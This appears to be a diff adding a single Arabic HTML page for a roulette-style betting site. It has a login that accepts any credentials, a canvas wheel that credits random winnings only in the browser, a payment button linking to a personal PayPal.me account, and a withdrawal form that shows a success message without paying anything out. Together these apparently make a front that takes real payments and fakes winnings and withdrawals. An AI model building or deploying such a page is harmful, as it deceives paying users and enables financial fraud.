@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>منصة الرهانات</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        .page {
+            display: none;
+            margin: 20px;
+        }
+        .active {
+            display: block;
+        }
+        .btn {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            margin: 10px;
+            border: none;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background-color: #45a049;
+        }
+        canvas {
+            margin: 20px auto;
+            display: block;
+        }
+        input, button {
+            margin: 10px;
+            padding: 10px;
+        }
+    </style>
+</head>
+<body>
+    <!-- صفحة تسجيل الدخول -->
+    <div id="loginPage" class="page active">
+        <h1>تسجيل الدخول</h1>
+        <input type="text" id="username" placeholder="اسم المستخدم">
+        <input type="password" id="password" placeholder="كلمة المرور">
+        <button class="btn" onclick="login()">تسجيل الدخول</button>
+    </div>
+
+    <!-- صفحة عجلة الروليت -->
+    <div id="roulettePage" class="page">
+        <h1>عجلة الحظ</h1>
+        <div id="rouletteWheel">
+            <canvas id="wheelCanvas" width="500" height="500"></canvas>
+            <button class="btn" onclick="spinWheel()">دُر الآن</button>
+            <h3 id="wheelResult"></h3>
+        </div>
+        <button class="btn" onclick="navigate('paymentPage')">اذهب إلى الدفع</button>
+    </div>
+
+    <!-- صفحة الدفع -->
+    <div id="paymentPage" class="page">
+        <h1>الدفع</h1>
+        <p>ادفع عبر PayPal واستمتع باللعب</p>
+        <a href="https://paypal.me/dreaminvestmentc?country.x=MA&locale.x=ar_EG" target="_blank" class="btn">الدفع الآن</a>
+        <button class="btn" onclick="navigate('roulettePage')">العودة إلى عجلة الحظ</button>
+    </div>
+
+    <!-- صفحة السحب -->
+    <div id="withdrawPage" class="page">
+        <h1>سحب الأرباح</h1>
+        <h2>رصيدك: <span id="withdrawBalance">$0</span></h2>
+        <input type="number" id="withdrawAmount" placeholder="المبلغ المراد سحبه">
+        <button class="btn" onclick="requestWithdrawal()">طلب السحب</button>
+        <button class="btn" onclick="navigate('roulettePage')">العودة إلى عجلة الحظ</button>
+    </div>
+
+    <script>
+        let balance = 0; // الرصيد الحالي
+
+        // تنقل بين الصفحات
+        function navigate(pageId) {
+            document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
+            document.getElementById(pageId).classList.add('active');
+        }
+
+        // تسجيل الدخول
+        function login() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            if (username && password) {
+                alert('تم تسجيل الدخول بنجاح');
+                navigate('roulettePage');
+            } else {
+                alert('يرجى إدخال اسم المستخدم وكلمة المرور');
+            }
+        }
+
+        // عجلة الروليت
+        const segments = ["5$", "10$", "15$", "20$", "50$", "100$", "200$", "500$", "1000$"];
+        const colors = ["#FF5733", "#33FF57", "#3357FF", "#FFC300", "#DAF7A6", "#C70039", "#900C3F", "#581845", "#28B463"];
+        const canvas = document.getElementById('wheelCanvas');
+        const ctx = canvas.getContext('2d');
+        const centerX = canvas.width / 2;
+        const centerY = canvas.height / 2;
+        const radius = 200;
+
+        function drawWheel() {
+            const arcSize = (2 * Math.PI) / segments.length;
+
+            segments.forEach((segment, index) => {
+                const startAngle = index * arcSize;
+                const endAngle = startAngle + arcSize;
+
+                ctx.beginPath();
+                ctx.moveTo(centerX, centerY);
+                ctx.arc(centerX, centerY, radius, startAngle, endAngle);
+                ctx.closePath();
+
+                ctx.fillStyle = colors[index];
+                ctx.fill();
+                ctx.stroke();
+
+                const textAngle = startAngle + arcSize / 2;
+                const textX = centerX + Math.cos(textAngle) * (radius - 50);
+                const textY = centerY + Math.sin(textAngle) * (radius - 50);
+
+                ctx.fillStyle = "#fff";
+                ctx.font = "bold 18px Arial";
+                ctx.fillText(segment, textX - ctx.measureText(segment).width / 2, textY + 5);
+            });
+        }
+
+        function spinWheel() {
+            const spinAngle = Math.random() * 360;
+            const spinTime = 2 + Math.random() * 3;
+            let currentAngle = 0;
+
+            const spinInterval = setInterval(() => {
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+                ctx.save();
+                ctx.translate(centerX, centerY);
+                ctx.rotate((currentAngle * Math.PI) / 180);
+                ctx.translate(-centerX, -centerY);
+                drawWheel();
+                ctx.restore();
+
+                currentAngle += 10;
+
+                if (currentAngle >= spinAngle + spinTime * 360) {
+                    clearInterval(spinInterval);
+                    const finalIndex = Math.floor(((currentAngle % 360) / 360) * segments.length);
+                    const prize = parseInt(segments[finalIndex].replace("$", ""));
+                    const reward = prize * 0.1; // نسبة 10% من المبلغ المدفوع
+                    balance += reward;
+                    document.getElementById("withdrawBalance").textContent = `$${balance.toFixed(2)}`;
+                    document.getElementById("wheelResult").textContent = `ربحت: ${reward.toFixed(2)}$!`;
+                }
+            }, 20);
+        }
+
+        drawWheel();
+
+        // السحب
+        function requestWithdrawal() {
+            const withdrawAmount = parseFloat(document.getElementById('withdrawAmount').value);
+
+            if (withdrawAmount > 0 && withdrawAmount <= balance) {
+                balance -= withdrawAmount;
+                document.getElementById('withdrawBalance').textContent = `$${balance.toFixed(2)}`;
+                alert(`تم سحب $${withdrawAmount.toFixed(2)} بنجاح!`);
+            } else {
+                alert("رصيد غير كافٍ أو مبلغ غير صحيح.");
+            }
+        }
+    </script>
+</body>
+</html>
